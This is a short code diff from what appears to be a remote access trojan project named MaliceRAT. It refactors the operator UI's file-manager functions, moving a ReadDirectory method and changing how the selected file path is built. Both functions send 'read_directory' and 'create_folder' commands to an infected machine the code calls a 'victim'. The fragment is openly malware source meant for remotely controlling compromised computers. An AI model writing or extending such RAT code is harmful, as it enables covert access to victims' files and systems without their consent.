@@ -55,17 +55,12 @@ namespace MaliceRAT.RatUI
         {
             ReadDirectory(gunadirPath.Text);
         }
-
-        private void ReadDirectory(string path)
-        {
-            server.GetVictimById(victimId).Send(new { type = "read_directory", path });
-        }
         #endregion
 
         #region Files context menu
         private string GetPath()
         {
-            return gunadirPath.Text + gunaFilesTable.SelectedCells[0].Value.ToString();
+            return gunadirPath.Text + GetSelectedFile();
         }
 
         private string GetSelectedFile()
@@ -115,6 +110,11 @@ namespace MaliceRAT.RatUI
         private void CreateFolder_Click(object sender, EventArgs e)
         {
             server.GetVictimById(victimId).Send(new { type = "create_folder", path = GetPath() });
+        }
+
+        private void ReadDirectory(string path)
+        {
+            server.GetVictimById(victimId).Send(new { type = "read_directory", path });
         }
 
         #endregion
